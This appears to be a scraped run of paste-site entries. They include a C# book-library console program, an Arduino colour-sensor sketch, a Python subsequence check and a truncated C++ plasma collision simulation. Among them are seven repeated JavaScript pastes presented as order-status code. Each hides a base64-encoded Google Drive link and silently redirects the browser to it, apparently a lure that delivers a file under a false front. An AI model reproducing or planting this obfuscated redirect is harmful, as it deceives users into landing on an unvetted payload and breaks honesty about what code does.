            Library library = new Library();

            library.IsWork();
        }
    }

    class Book
    {
        public Book(string title, string author, int yearOfRelease, int number)
        {
            Title = title;
            Author = author;
            YearOfRelease = yearOfRelease;
            Number = number;
        }

        public string Title { get; private set; }
        public string Author { get; private set; }
        public int YearOfRelease { get; private set; }
        public int Number { get; private set; }

        public void ShowInfo()
        {
            Console.WriteLine($""{Number}. Название: {Title} | Автор: {Author} | Год выпуска: {YearOfRelease}"");
        }
    }

    class Library
    {
        private List<Book> _books;

        public Library()
        {
            _books = new List<Book>();
        }

        public void IsWork()
        {
            const string CommandAddBook = ""add"";
            const string CommandRemoveBook = ""del"";
            const string CommandShowBooks = ""show"";
            const string CommandFindBook = ""find"";
            const string CommandExitLibrary = ""exit"";

            bool isWork = true;

            while (isWork)
            {
                Console.WriteLine(""Вы находитесь в хранилище книг"");
                Console.WriteLine($""Введите {CommandAddBook} чтобы добавить книгу в хранилище."");
                Console.WriteLine($""Введите {CommandRemoveBook} чтобы удалить книгу из хранилища."");
                Console.WriteLine($""Введите {CommandShowBooks} чтобы посмотреть все книги которые находятся в харнилище."");
                Console.WriteLine($""Введите {CommandFindBook} чтобы найти нужную книгу."");
                Console.WriteLine($""Введите {CommandExitLibrary} чтобы выйти из хранилища."");
                Console.Write(""Выберите действие: "");

                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case CommandAddBook:
                        AddBook();
                        break;

                    case CommandRemoveBook:
                        RemoveBook();
                        break;

                    case CommandShowBooks:
                        ShowAllBooks();
                        break;

                    case CommandFindBook:
                        FindBook();
                        break;

                    case CommandExitLibrary:
                        isWork = ExitProgram();
                        break;

                    default:
                        Console.WriteLine(""Некорректный ввод, попробуйте еще раз."");
                        break;
                }

                Console.ReadKey();
                Console.Clear();
            }
        }

        private void AddBook()
        {
            Console.WriteLine(""Введите название книги:"");
            string bookTitle = Console.ReadLine();

            Console.WriteLine(""Введите имя автора:"");
            string bookAuthor = Console.ReadLine();

            int bookYearOfRelease = ReadNumber(""Введите год выпуска книги:"");

            int bookNumber = _books.Count + 1;

            _books.Add(new Book(bookTitle, bookAuthor, bookYearOfRelease, bookNumber));

            Console.WriteLine(""Книга добавлена!"");
        }

        private void RemoveBook()
        {
            if (IsEmptyListBooks() == false)
            {
                int bookNumber = ReadNumber(""Введите номер книги для удаления"");

                if (TryGetBook(bookNumber, out Book book))
                {
                    _books.Remove(book);
                }
                else
                {
                    Console.WriteLine(""Нет книги с таким номером!"");
                }

                Console.WriteLine(""Книга удалена!"");
            }
        }

        private void ShowAllBooks()
        {
            if (IsEmptyListBooks() == false)
            {
                Console.WriteLine(""Список книг:"");

                foreach (Book book in _books)
                {
                    book.ShowInfo();
                }
            }
        }

        private void FindBook()
        {
            if (IsEmptyListBooks() == false)
            {
                const string CommandFindByName = ""name"";
                const string CommandFindByAuthor = ""author"";
                const string CommandFindByYearOfRelease = ""year"";

                Console.WriteLine(""Выберите параметр поиска"");
                Console.WriteLine($""Введите {CommandFindByName} если хотите найти книгу по названию"");
                Console.WriteLine($""Введите {CommandFindByAuthor} если хотите найти книгу по автору"");
                Console.WriteLine($""Введите {CommandFindByYearOfRelease} если хотите найти книгу по году её релиза"");

                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case CommandFindByName:
                        FindByName();
                        break;

                    case CommandFindByAuthor:
                        FindByAuthor();
                        break;

                    case CommandFindByYearOfRelease:
                        FindByYearOfRelease();
                        break;

                    default:
                        Console.WriteLine(""Некорректный ввод, попробуйте еще раз."");
                        break;
                }

                Console.ReadKey();
                Console.Clear();
            }
        }

        private void FindByName()
        {
            bool isFoundName = false;
            string searchName = Console.ReadLine();

            foreach (Book book in _books)
            {
                if (searchName == book.Title)
                {
                    book.ShowInfo();
                    isFoundName = true;
                }
            }

            if (!isFoundName)
            {
                Console.WriteLine(""Нет такого названия"");
            }
        }

        private void FindByAuthor()
        {
            bool isFoundAuthor = false;
            string searchAuthor = Console.ReadLine();

            foreach (Book book in _books)
            {
                if (searchAuthor == book.Author)
                {
                    book.ShowInfo();
                    isFoundAuthor = true;
                }
            }

            if (!isFoundAuthor)
            {
                Console.WriteLine(""Нет такого автора"");
            }
        }

        private void FindByYearOfRelease()
        {
            bool isFoundYearOfRelease = false;
            int searchYear = ReadNumber(""Введите год выпуска книги для поиска: "");

            foreach (Book book in _books)
            {
                if (searchYear == book.YearOfRelease)
                {
                    book.ShowInfo();
                    isFoundYearOfRelease = true;
                }
            }

            if (!isFoundYearOfRelease)
            {
                Console.WriteLine($""Нет книги с таким годом."");
            }
        }

        private bool ExitProgram()
        {
            Console.WriteLine(""Вы вышли из программы!"");

            return false;
        }

        private bool TryGetBook(int bookNumber, out Book foundBook)
        {
            foundBook = null;

            bool isBookFound = true;

            foreach (Book book in _books)
            {
                if (book.Number == bookNumber)
                {
                    foundBook = book;

                    return isBookFound;
                }
            }

            return false;
        }

        private bool IsEmptyListBooks()
        {
            bool isEmpty = false;

            if (_books.Count == 0)
            {
                isEmpty = true;
                Console.WriteLine(""Список пуст!"");
            }

            return isEmpty;
        }

        private int ReadNumber(string message)
        {
            int number = 0;
            bool isNumber = false;

            while (isNumber == false)
            {
                Console.Write(message);
                isNumber = int.TryParse(Console.ReadLine(), out number);
            }

            return number;
        }
    }
}
"
kiRUBBpa,Order.js,WantingTrae,JavaScript,Saturday 19th of April 2025 02:52:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34745/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H1vqUnWs,"""Sensor Data"" rev_01",pleasedontcode,Arduino,Saturday 19th of April 2025 02:41:24 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Sensor Data""
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-04-19 19:39:23

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* i need the sensor to be very accurate in the color */
	/* coding  I need to be able to read the codes */
	/* through my software */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <FreqCount.h>	//https://github.com/PaulStoffregen/FreqCount
#include <DHT.h>	//https://github.com/adafruit/DHT-sensor-library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void GetData(); // Added prototype for GetData function
void ReadColorData(); // New prototype for reading color data

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t myDHT22_DHT22_DOUT_PIN_D2		= 2;

// Added definitions for the photodiode module pins
#define s0 8       // Module pins wiring
#define s1 9
#define s2 10
#define s3 11
#define out 12

int data=0;        // This is where we're going to stock our values

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
// Instantiate DHT sensor
DHT dht(myDHT22_DHT22_DOUT_PIN_D2, DHT22); // Assuming DHT22 sensor

void setup(void)
{
	// put your setup code here, to run once:

	pinMode(myDHT22_DHT22_DOUT_PIN_D2, INPUT_PULLUP);

	// Initialize photodiode pins
	pinMode(s0, OUTPUT);    // pin modes
	pinMode(s1, OUTPUT);
	pinMode(s2, OUTPUT);
	pinMode(s3, OUTPUT);
	pinMode(out, INPUT);

	Serial.begin(9600);   // Initialize the serial monitor baud rate
	
	digitalWrite(s0, HIGH);  // Putting S0/S1 on HIGH/HIGH levels means the output frequency scaling is at 100% (recommended)
	digitalWrite(s1, HIGH); // LOW/LOW is off HIGH/LOW is 20% and LOW/HIGH is 2%

	// Initialize DHT sensor
	dht.begin();
}

void loop(void)
{
	// put your main code here, to run repeatedly:
	ReadColorData(); // Call to read color data

	Serial.println();

	delay(2000);
}

void GetData(){
	data = pulseIn(out, LOW);       // here we wait until ""out"" goes LOW, we start measuring the duration and stops when ""out"" is HIGH again
	Serial.print(data);          // it's a time duration measured, which is related to frequency as the sensor gives a frequency depending on the color
	Serial.print(""\t"");          // The higher the frequency the lower the duration
	delay(20);
}

void ReadColorData() {
	// Read Red value
	digitalWrite(s2, LOW);
	digitalWrite(s3, LOW);
	Serial.print(""Red value= ""); 
	GetData();                   // Executing GetData function to get the value

	// Read Blue value
	digitalWrite(s2, LOW);
	digitalWrite(s3, HIGH);
	Serial.print(""Blue value= "");
	GetData();

	// Read Green value
	digitalWrite(s2, HIGH);
	digitalWrite(s3, HIGH);
	Serial.print(""Green value= "");
	GetData();
}

/* END CODE */"
65g975K4,Market.js,WantingTrae,JavaScript,Saturday 19th of April 2025 02:36:59 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33249/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KeqsSnP9,Untitled,WantingTrae,JavaScript,Saturday 19th of April 2025 02:21:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93137/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zMwyGTwD,Products.js,WantingTrae,JavaScript,Saturday 19th of April 2025 02:05:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67536/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Z8zsHNDB,Order.js,WantingTrae,JavaScript,Saturday 19th of April 2025 01:50:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34895/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eThspaSg,Market.js,WantingTrae,JavaScript,Saturday 19th of April 2025 01:34:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16129/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BnJ1K7Pd,Is subsequence,smj007,Python,Saturday 19th of April 2025 01:31:13 PM CDT,"class Solution:
    def isSubsequence(self, s: str, t: str) -> bool:

        i = 0
        j = 0

        while (i < len(s) and j < len(t)):
            if s[i] == t[j]:
                i += 1
            j += 1

        return i == len(s)

        # if j == len(t) and not i == len(s):
        #     return False
        # elif i == len(s) and not j == len(t):
        #     return True
        # elif i == len(s) and j == len(t):
        #     return True

"
nwm2LGJL,Untitled,WantingTrae,JavaScript,Saturday 19th of April 2025 01:19:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/86764/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Wd1CPvcd,Products.js,WantingTrae,JavaScript,Saturday 19th of April 2025 01:03:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66479/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RiBcUaFE,excitation_radiative_decay_added,phystota,C++,Saturday 19th of April 2025 12:56:16 PM CDT,"#include <iostream>
#include <random>
#include <fstream>
#include <assert.h>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota

//physical constants

#define m_e 9.1093837E-31 // electron mass in kg
#define M_n 6.6464731E-27 // Helium atom mass
#define k_b 1.380649E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define Coulomb_log 15.87 // Coulomb logarithm
#define epsilon_0 8.854188E-12 // Vacuum permittivity
#define Coulomb_const pow(q,4)/(pow(4.0*M_PI*epsilon_0,2)) // e^4/(4*pi*eps0)^2
#define thresh1 19.82 // threshold energy excitation tripet state
#define thresh2 20.61 // threshold energy excitation singlet state
#define tau_singlet 0.0195

// simulation parameters

#define n_e 50000
// #define N_He 1000000 // Helium neutrals number
#define T_n 2.0 // Helium neutral temperature in eV
#define T_e 5.0    // electron Maxwell initial distribution
#define Emin 0.0
#define Emax 3000.0
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 1.0E-3 // 500 microsec time to equalibrate the system
#define dopant 1.0E-5 // addition to avoid zero
#define E_reduced 0.0 // constant electrin field along z-axis

#define bin_width 0.05 // keep energy step ~ this to maintain cross-section clarity (Ramsauer minimum etc)
#define N ( (int)((Emax-Emin)/bin_width) + 1) // add 1 to include E_max if needed?

// handling final energy bin

#define bin_width_smooth 0.05 // energy bin for smooth final distribution
#define N_smooth ( (int)((Emax-Emin)/bin_width_smooth) )



double solve_A(double s) { // Netwon method solver

    if (s > 3) {
        return 3*exp(-s);
    }
    if (s < 0.01) {
        return 1.0/s;
    }
    
    double A0 = 0.01; // initial guess
    double A = A0;  //starting with initial guess
    double tol = 1.0E-7; // accuracy

             
    for (int i = 0; i < 1000; i++){

        double tanhA = tanh(A);
        // Avoid division by an extremely small tanh(A)
        if (fabs(tanhA) < 1e-12) {
            std::cerr << ""tanh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-7;
        }        

        double f = 1.0 / tanhA - 1.0 / A - exp(-s);
        if (fabs(f) < tol)
            break;

        double sinhA = sinh(A);
        if (fabs(sinhA) < 1e-12) {
            std::cerr << ""sinh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-5;
        }

        double dfdA = -1.0/(sinh(A)*sinh(A)) + 1.0/(A*A);

        // Check if derivative is too close to zero to avoid huge updates
        if (fabs(dfdA) < 1e-12) {
            std::cerr << ""dfdA is too small at iteration "" << i << "", returning fallback\n"";
            if (s < 0.01) {
//                std::cout << ""Small s! Huge A!"" << ""\n"";
                return 1.0/s;
            }
            if (s > 3) {
                return 3.0*exp(-s);
            }
        }        

        A -= f/dfdA;

        // Early check for numerical issues
        if (std::isnan(A) || std::isinf(A)) {
            std::cerr << ""Numerical error detected, invalid A at iteration "" << i << ""\n"";
            return (A > 0) ? 1.0E-5 : -1.0E-5;  // Fallback value based on sign
        }        


    }

    return A;
}

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided_en = false;
    bool collided_ee = false;

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};

struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& CS) {


    if (energy < CS.front().energy) {
//        std::cout << "" required energy value lower than range of cross-section data at energy: "" << energy << ""\n"";
        return 0.0;
    }
    if (energy > CS.back().energy) {
//        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < CS.size() && energy > CS[step].energy) {
            step++;
        }

    double k = (CS[step].sigma - CS[step-1].sigma)/(CS[step].energy - CS[step-1].energy);
    double m = CS[step].sigma - k*CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};

struct Excited_neutral {

    double energy;
    double vx;
    double vy;
    double vz;
    
};



int main() {

    clock_t start = clock();

    int N_He = 10000000;

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<NeutralParticle> neutrals(N_He); // I don't need a vector of neutrals bcs it's like a backhround in MCC-simulation

    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram
    std::vector<int> histo_excited(N, 0); // initialize N size zero-vector for excited He distribution histogram

    std::vector<double> elastic_vec(N, 0); // precompiled elastic cross-section-energy vector
    std::vector<double> inelastic1_vec(N, 0); // precompiled inelastic(triplet excitation) cross-section-energy vector
    std::vector<double> inelastic2_vec(N, 0); // precompiled inelastic(singlet excitation) cross-section-energy vector    
    std::vector<double> superelastic1_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector
    std::vector<double> superelastic2_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::ifstream elastic_cs_dat(""cross_sections/elastic.dat"");
    if (!elastic_cs_dat.is_open()) {
        std::cerr << ""Error opening elastic cross-sections file!"" << std::endl;
        return 1;
    }    

    std::ifstream excitation1_cs_dat(""cross_sections/inelastic_triplet.dat"");
    if (!excitation1_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic triplet cross-sections file!"" << std::endl;
        return 1;
    }

    std::ifstream excitation2_cs_dat(""cross_sections/inelastic_singlet.dat"");
    if (!excitation2_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic singlet cross-sections file!"" << std::endl;
        return 1;
    }

    // --- starts reading cross section datafiles

//-----------------elastic---------------------------//
    std::vector<CrossSection> elastic_CS_temp;

    double energy, sigma;

    while (elastic_cs_dat >> energy >> sigma) {
        elastic_CS_temp.push_back({energy, sigma});
    }    
    elastic_cs_dat.close();

    energy = 0.0;
    sigma = 0.0;
//-----------------triplet excitation---------------------------//
    std::vector<CrossSection> inelastic1_CS_temp;

    while (excitation1_cs_dat >> energy >> sigma) {
        inelastic1_CS_temp.push_back({energy, sigma});
    }    
    excitation1_cs_dat.close();    
//-----------------singlet excitation---------------------------//
    energy = 0.0;
    sigma = 0.0;

    std::vector<CrossSection> inelastic2_CS_temp;

    while (excitation2_cs_dat >> energy >> sigma) {
        inelastic2_CS_temp.push_back({energy, sigma});
    }    
    excitation2_cs_dat.close();    

    // --- finish reading cross-section datafiles  

    std::ofstream file0(""output_files/velocities.dat"");    
    std::ofstream file1(""output_files/energies.dat"");        
    std::ofstream file2(""output_files/energies_final.dat"");    
    std::ofstream file3(""output_files/histo_random.dat"");    
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""output_files/histo_maxwell.dat"");
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""output_files/neutral_distribution.dat"");    
    std::ofstream file6(""output_files/E*f(E).dat"");    
    std::ofstream file7(""output_files/nu_max.dat"");
    std::ofstream file8(""output_files/electron_mean_energy.dat"");
    std::ofstream file9(""output_files/nu_elastic_average_initial.dat"");
    std::ofstream file10(""output_files/nu_inelastic1_average_initial.dat"");
    std::ofstream file11(""output_files/nu_elastic_average_final.dat"");
    std::ofstream file12(""output_files/nu_inelastic1_average_final.dat""); 
    std::ofstream file13(""output_files/log_output.dat"");  
    std::ofstream file14(""output_files/excited_energies.dat"");       
    std::ofstream file15(""output_files/excited_histo.dat"");             
    std::ofstream file_temp(""output_files/collision_rates.dat"");
    std::ofstream file16(""output_files/energy_gain.dat"");  

    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis, maxwell_electron);
    }

    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic_vec[i] = interpolate(bin_width*(i+0.5), elastic_CS_temp); //elastiuc
        inelastic1_vec[i] = interpolate(bin_width*(i+0.5), inelastic1_CS_temp); //triplet excitation
        inelastic2_vec[i] = interpolate(bin_width*(i+0.5), inelastic2_CS_temp); //singlet excitation
    }

    // precalculate superelastic cross-section (triplet -> ground) for each energy bin
    // detailed balance gives: sigma_j_i(E) = (g_i/g_j)*((E+theshold)/E)*sigma_i_j(E+theshold)
    for (int i = 0; i < N; i++){
        double energy = Emin + (i + 0.5) * bin_width;
        int thresh_bin = (int)( (thresh1 - Emin)/bin_width ); // calculating bin for threshold energy
        superelastic1_vec[i] = (1.0/3.0)*((energy + thresh1)/energy)*interpolate(energy + thresh1, inelastic1_CS_temp); // using detailed balance, calculating backward deexcitation cross-section
        superelastic2_vec[i] = (1.0/1.0)*((energy + thresh2)/energy)*interpolate(energy + thresh2, inelastic2_CS_temp);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // -----initial electrons energy distribution starts------------////
    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file3 << bin_center << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // this is electron normalized distribution function
    }



    //calculating excited specied population

    /*From Boltzman distribution y_k = g_k*exp(-E_k/kT)/norm, where g_k - stat weight of k-state, 
    E_k - threshold energy for k-state, norm is a total partition function or normaliztion factor     */

    double part_ground = 1.0*exp(-0.0/T_n); // partition function for ground state
